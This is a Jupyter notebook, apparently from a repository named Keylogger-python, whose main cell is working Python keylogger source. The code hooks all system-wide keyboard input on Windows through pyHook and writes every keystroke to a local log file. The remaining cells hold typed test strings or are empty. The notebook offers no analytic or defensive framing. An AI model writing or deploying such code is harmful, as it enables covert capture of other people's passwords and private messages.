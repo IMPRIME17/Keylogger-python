{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pythoncom, pyHook, requests\n",
    "import tempfile\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "jhuyuuyjhbjhbjbjhbjhbjbuvu<ctrl>"
     ]
    }
   ],
   "source": [
    "def keypressed(event):\n",
    "    global store\n",
    "    mappings = {8: \"<backspace>\", 13: \"\\n\", 27: \"<esc>\", 32: \" \", 46: \"<del>\", 91: \"<win>\",\n",
    "                160: \"<shft>\", 162: \"<ctrl>\", 163: \"<r-ctrl>\", 164: \"<alt>\", 165: \"<ralt>\", 9: \"<tab>\",\n",
    "                48: \"0\", 49: \"1\", 50: \"2\", 51: \"3\", 52: \"4\", 53: \"5\", 54: \"6\", 55: \"7\", 56: \"8\", 57: \"9\",\n",
    "                37: \"←\", 38: \"↑\", 39: \"→\", 40: \"↓\",\n",
    "                192: \"ö\", 222: \"ä\", 186: \"ü\", 187: \"+\", 191: \"#\",\n",
    "                188: \",\", 190: \".\", 189: \"-\", 219: \"ß\", 221: \"´\", 107: \"+\", 109: \"-\", 111: \"/\", 106: \"*\"\n",
    "                }\n",
    "    try:\n",
    "        id = event.KeyID\n",
    "        if not id in mappings:\n",
    "            char = chr(id).lower()\n",
    "        else:\n",
    "            char = mappings.get(id)\n",
    "        store = store + char\n",
    "        fp = open('logs_windows.txt','w+')\n",
    "        print(char,end='')\n",
    "        fp.write(store)\n",
    "        fp.close()\n",
    "    except Exception as e:\n",
    "        print(str(e))\n",
    "    return True\n",
    "\n",
    "store = ''\n",
    "obj = pyHook.HookManager()\n",
    "obj.KeyDown = keypressed\n",
    "obj.HookKeyboard()\n",
    "pythoncom.PumpMessages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "jhhmhjgguyguyfuff"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "jggfyyhvcufhvhvyt6kgiuygifiyti51513181236511jhuyuuyjhbjhbjbjhbjhbjbuvu"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
